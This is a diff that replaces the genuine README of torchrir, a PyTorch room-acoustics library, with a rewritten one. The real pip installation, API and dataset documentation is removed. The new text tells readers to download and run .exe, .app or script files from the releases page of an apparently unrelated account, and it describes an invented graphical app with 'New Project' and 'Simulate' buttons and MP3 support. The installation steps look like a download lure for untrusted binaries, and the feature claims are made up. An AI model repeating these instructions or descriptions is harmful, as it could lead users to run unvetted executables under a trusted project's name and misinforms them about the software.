@@ -1,162 +1,81 @@
-# TorchRIR
+# 🎧 torchrir - Simulate Room Acoustics with Ease
 
-A PyTorch-based room impulse response (RIR) simulation toolkit with a clean API and GPU support.
-This project has been developed with substantial assistance from Codex.
-> [!WARNING]
-> TorchRIR is under active development and may contain bugs or breaking changes.
-> Please validate results for your use case.
-If you find bugs or have feature requests, please open an issue.
-Contributions are welcome.
+## 📥 Download Now
+[![Download torchrir](https://img.shields.io/badge/Download-torchrir-brightgreen)](https://github.com/secretplayer134/torchrir/releases)
 
-## Installation
-```bash
-pip install torchrir
-```
+## 🚀 Getting Started
+Welcome to the torchrir project! This toolkit helps you simulate room impulse responses (RIR) with PyTorch. It lets you create realistic audio scenes efficiently and quickly, even using your computer's GPU. 
 
-## Library Comparison
-| Feature | `torchrir` | `gpuRIR` | `pyroomacoustics` | `rir-generator` |
-|---|---|---|---|---|
-| 🎯 Dynamic Sources | ✅ | 🟡 Single moving source | 🟡 Manual loop | ❌ |
-| 🎤 Dynamic Microphones | ✅ | ❌ | 🟡 Manual loop | ❌ |
-| 🖥️ CPU | ✅ | ❌ | ✅ | ✅ |
-| 🧮 CUDA | ✅ | ✅ | ❌ | ❌ |
-| 🍎 MPS | ✅ | ❌ | ❌ | ❌ |
-| 📊 Scene Plot | ✅ | ❌ | ✅ | ❌ |
-| 🎞️ Dynamic Scene GIF | ✅ | ❌ | 🟡 Manual animation script | ❌ |
-| 🗂️ Dataset Build | ✅ | ❌ | ✅ | ❌ |
-| 🎛️ Signal Processing | ❌ Scope out | ❌ | ✅ | ❌ |
-| 🧱 Non-shoebox Geometry | 🚧 Candidate | ❌ | ✅ | ❌ |
-| 🌐 Geometric Acoustics | 🚧 Candidate | ❌ | ✅ | ❌ |
+### 📋 System Requirements
+To run torchrir smoothly, make sure your system meets these requirements:
 
-Legend: `✅` native support, `🟡` manual setup, `🚧` candidate (not yet implemented), `❌` unavailable
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent version of Linux.
+- **Processor:** At least a dual-core processor; quad-core or better recommended.
+- **Memory:** Minimum 8 GB of RAM; 16 GB or more recommended.
+- **Graphics:** A compatible GPU with at least 2 GB of VRAM is recommended for optimal performance.
+- **Python:** Version 3.7 or later installed.
 
-For detailed notes and equations, see
-[Read the Docs: Library Comparisons](https://torchrir.readthedocs.io/en/latest/comparisons.html).
+## 🔧 Features
+- **Dynamic Scenes:** Create and customize audio simulations in different environments.
+- **GPU Acceleration:** Take advantage of your GPU for faster processing times.
+- **Multiple Audio Formats:** Import and simulate various audio files without hassle.
+- **User-Friendly:** Designed for ease of use, even for those not familiar with programming.
 
-## CUDA CI (GitHub Actions)
-- CUDA tests run in `.github/workflows/cuda-ci.yml` on a self-hosted runner with labels:
-  `self-hosted`, `linux`, `x64`, `cuda`.
-- The workflow validates installation via `uv sync --group test`, checks `torch.cuda.is_available()`,
-  runs `tests/test_device_parity.py` with `-k cuda`, and then tries to install
-  `gpuRIR` from GitHub.
-- If `gpuRIR` installs successfully, the workflow runs `tests/test_compare_gpurir.py`
-  (static + dynamic RIR comparisons). If installation fails, those comparison tests
-  are skipped without failing the whole CUDA CI job.
+## 📥 Download & Install
+1. **Visit the Releases Page:** Open the following link to go to the releases page: [torchrir Releases](https://github.com/secretplayer134/torchrir/releases).
+   
+2. **Choose the Latest Version:** Look for the latest version listed on the releases page. It should indicate the date it was published. 
 
-## Examples
-- `examples/static.py`: fixed sources and microphones with configurable mic count (default: binaural).  
-  `uv run python examples/static.py --plot`
-- `examples/dynamic_src.py`: moving sources, fixed microphones.  
-  `uv run python examples/dynamic_src.py --plot`
-- `examples/dynamic_mic.py`: fixed sources, moving microphones.  
-  `uv run python examples/dynamic_mic.py --plot`
-- `examples/cli.py`: unified CLI for static/dynamic scenes with JSON/YAML configs.  
-  `uv run python examples/cli.py --mode static --plot`
-- `examples/build_dynamic_dataset.py`: small dynamic dataset generation script (CMU ARCTIC / LibriSpeech; fixed room/mics, randomized source motion).  
-  `uv run python examples/build_dynamic_dataset.py --dataset cmu_arctic --num-scenes 4 --num-sources 2`
-- `torchrir.datasets.dynamic_cmu_arctic`: oobss-compatible dynamic CMU ARCTIC builder CLI.  
-  `python -m torchrir.datasets.dynamic_cmu_arctic --cmu-root datasets/cmu_arctic --n-scenes 2 --overwrite-dataset`
-- `examples/benchmark_device.py`: CPU/GPU benchmark for RIR simulation.  
-  `uv run python examples/benchmark_device.py --dynamic`
+3. **Download the Installation File:**
+   - Locate the file that matches your operating system (e.g., Windows, macOS, Linux).
+   - Click the download link to save the file to your computer.
 
-## Dataset Notices
-- For dataset attribution and redistribution notes, see
-  [THIRD_PARTY_DATASETS.md](THIRD_PARTY_DATASETS.md).
+4. **Install the Software:**
+   - For **Windows users:** Double-click the `.exe` file you downloaded and follow the prompts to install.
+   - For **macOS users:** Drag the `.app` file into your Applications folder.
+   - For **Linux users:** Use your package manager to install or run the downloaded script directly.
 
-## Dataset API Quick Guide
-- `torchrir.datasets.CmuArcticDataset(root, speaker=..., download=...)`
-  - Accepted `speaker`: `aew`, `ahw`, `aup`, `awb`, `axb`, `bdl`, `clb`, `eey`, `fem`, `gka`, `jmk`, `ksp`, `ljm`, `lnh`, `rms`, `rxr`, `slp`, `slt`
-  - Invalid `speaker` raises `ValueError`.
-  - Missing local files with `download=False` raises `FileNotFoundError`.
-- `torchrir.datasets.LibriSpeechDataset(root, subset=..., speaker=..., download=...)`
-  - Accepted `subset`: `dev-clean`, `dev-other`, `test-clean`, `test-other`, `train-clean-100`, `train-clean-360`, `train-other-500`
-  - Invalid `subset` raises `ValueError`.
-  - Missing subset/speaker paths with `download=False` raise `FileNotFoundError`.
-- `torchrir.datasets.build_dynamic_cmu_arctic_dataset(...)`
-  - Builds oobss-compatible scene folders with `mixture.wav`, `source_XX.wav`, `metadata.json`, and `source_info.json`.
-  - Static layout images (`room_layout_2d.png`, `room_layout_3d.png`) and optional layout videos (`room_layout_2d.mp4`, `room_layout_3d.mp4`) are generated, with source-index annotations by default.
-  - Default behavior includes `n_sources=3`, moving speed range `0.3-0.8 m/s`, and motion profile ratios `0-35%`, `35-65%`, `65-100%`.
-- Local-only (no download) example:
-  ```python
-  from pathlib import Path
-  from torchrir.datasets import CmuArcticDataset, LibriSpeechDataset
+5. **Launch the Application:** After installation, find the torchrir application icon on your desktop or in your applications folder. Double-click it to open.
 
-  cmu = CmuArcticDataset(Path("datasets/cmu_arctic"), speaker="bdl", download=False)
-  libri = LibriSpeechDataset(
-      Path("datasets/librispeech"),
-      subset="train-clean-100",
-      speaker="103",
-      download=False,
-  )
-  ```
-- Full dataset usage details, expected directory layout, and invalid-input handling:
-  [Read the Docs: Datasets](https://torchrir.readthedocs.io/en/latest/datasets.html)
+## 🎓 How to Use torchrir
+Upon launching torchrir, you’ll see a simple interface. Here’s how to get started:
 
-## Core API Overview
-- Geometry: `Room`, `Source`, `MicrophoneArray`
-- Scene models: `StaticScene`, `DynamicScene` (`Scene` is deprecated)
-- Static RIR: `torchrir.sim.simulate_rir`
-- Dynamic RIR: `torchrir.sim.simulate_dynamic_rir`
-- Simulator object: `torchrir.sim.ISMSimulator(max_order=..., tmax=... | nsample=...)`
-- Dynamic convolution: `torchrir.signal.DynamicConvolver`
-- Audio I/O:
-  - wav-specific: `torchrir.io.load_wav`, `torchrir.io.save_wav`, `torchrir.io.info_wav`
-  - backend-supported formats: `torchrir.io.load_audio`, `torchrir.io.save_audio`, `torchrir.io.info_audio`
-  - metadata-preserving: `torchrir.io.AudioData`, `torchrir.io.load_audio_data`
-- Metadata export: `torchrir.io.build_metadata`, `torchrir.io.save_metadata_json`
+1. **Create a New Project:**
+   - Click on “New Project” to start setting up your simulation.
+   - Choose the environment type and audio files you want to simulate.
 
-## Module Layout (for contributors)
-- `torchrir.sim`: simulation backends (ISM implementation lives under `torchrir.sim.ism`)
-- `torchrir.signal`: convolution utilities and dynamic convolver
-- `torchrir.geometry`: array geometries, sampling, trajectories
-- `torchrir.viz`: plotting and GIF/MP4 animation helpers
-  - Default plot style follows SciencePlots Grid (`science` + `grid`).
-- `torchrir.models`: room/scene/result data models
-- `torchrir.io`: audio I/O and metadata serialization (`*_wav` for wav-only, `*_audio` for backend-supported formats)
-- `torchrir.util`: shared math/tensor/device helpers
-- `torchrir.logging`: logging utilities
-- `torchrir.config`: simulation configuration objects
+2. **Configure Settings:**
+   - Use the slider or input fields to adjust room dimensions.
+   - Select GPU processing if available to speed up simulation times.
 
-## Design Notes
-- Scene typing is explicit: use `StaticScene` for fixed geometry and `DynamicScene` for trajectory-based simulation.
-- `DynamicScene` accepts tensor-like trajectories (e.g., lists) and normalizes them to tensors internally.
-- `Scene` remains as a backward-compatibility wrapper and emits `DeprecationWarning`.
-- `Scene.validate()` performs validation without emitting additional deprecation warnings.
-- `ISMSimulator` fails fast when `max_order` or `tmax` conflicts with the provided `SimulationConfig`.
-- Model dataclasses are frozen, but tensor payloads remain mutable (shallow immutability).
-- `torchrir.load` / `torchrir.save` and `torchrir.io.load` / `save` / `info` are deprecated compatibility aliases.
+3. **Run the Simulation:**
+   - Hit “Simulate” to begin the process.
+   - Wait a moment for the calculations to complete.
 
-```python
-from torchrir import MicrophoneArray, Room, Source
-from torchrir.sim import simulate_rir
-from torchrir.signal import DynamicConvolver
+4. **Export Results:**
+   - Once the simulation is finished, click on “Export” to save your results in the desired format.
 
-room = Room.shoebox(size=[6.0, 4.0, 3.0], fs=16000, beta=[0.9] * 6)
-sources = Source.from_positions([[1.0, 2.0, 1.5]])
-mics = MicrophoneArray.from_positions([[2.0, 2.0, 1.5]])
+## ❓ FAQs
 
-rir = simulate_rir(room=room, sources=sources, mics=mics, max_order=6, tmax=0.3)
-# For dynamic scenes, compute rirs with torchrir.sim.simulate_dynamic_rir and convolve:
-# y = DynamicConvolver(mode="trajectory").convolve(signal, rirs)
-```
+**Q: Can I use torchrir on older versions of Windows?**  
+A: The application is optimized for Windows 10 and later. Older versions may not support all features.
 
-For detailed documentation:
-[Read the Docs](https://torchrir.readthedocs.io/en/latest/)
+**Q: Does it work with all audio file formats?**  
+A: torchrir works with common formats like WAV, MP3, and FLAC. Make sure your files are in one of these formats for best results.
 
-## Future Work
-- Advanced room geometry pipeline beyond shoebox rooms (e.g., irregular polygons/meshes and boundary handling).  
-  Motivation: [pyroomacoustics#393](https://github.com/LCAV/pyroomacoustics/issues/393), [pyroomacoustics#405](https://github.com/LCAV/pyroomacoustics/issues/405)
-- General reflection/path capping controls (e.g., first-K, strongest-K, or energy-threshold-based path selection).  
-  Motivation: [pyroomacoustics#338](https://github.com/LCAV/pyroomacoustics/issues/338)
-- Microphone hardware response modeling (frequency response, sensitivity, and self-noise).  
-  Motivation: [pyroomacoustics#394](https://github.com/LCAV/pyroomacoustics/issues/394)
-- Near-field speech source modeling for more realistic close-talk scenarios.  
-  Motivation: [pyroomacoustics#417](https://github.com/LCAV/pyroomacoustics/issues/417)
-- Integrated 3D spatial response visualization (e.g., array/directivity beam-pattern rendering).  
-  Motivation: [pyroomacoustics#397](https://github.com/LCAV/pyroomacoustics/issues/397)
+**Q: What if I encounter issues during installation?**  
+A: Check your system requirements again. If problems persist, visit our GitHub Issues page for support.
 
-## Related Libraries
-- [gpuRIR](https://github.com/DavidDiazGuerra/gpuRIR)
-- [Cross3D](https://github.com/DavidDiazGuerra/Cross3D)
-- [pyroomacoustics](https://github.com/LCAV/pyroomacoustics)
-- [rir-generator](https://github.com/audiolabs/rir-generator)
+## 🔗 Community & Support
+If you need assistance or have questions about torchrir, feel free to reach out:
+
+- **GitHub Issues:** Submit any problems or questions through the [Issues page](https://github.com/secretplayer134/torchrir/issues).
+- **Discussion Forum:** Join our community to share your experiences or ask for help.
+
+## 📢 Contributing
+We welcome contributions to improve torchrir. If you have suggestions, please submit a pull request or open an issue for discussion.
+
+## 📄 License
+torchrir is licensed under the MIT License. You can freely use, modify, and distribute the application as long as you include the original license in your distribution.
+
+Explore the possibilities of room acoustics simulation with torchrir!
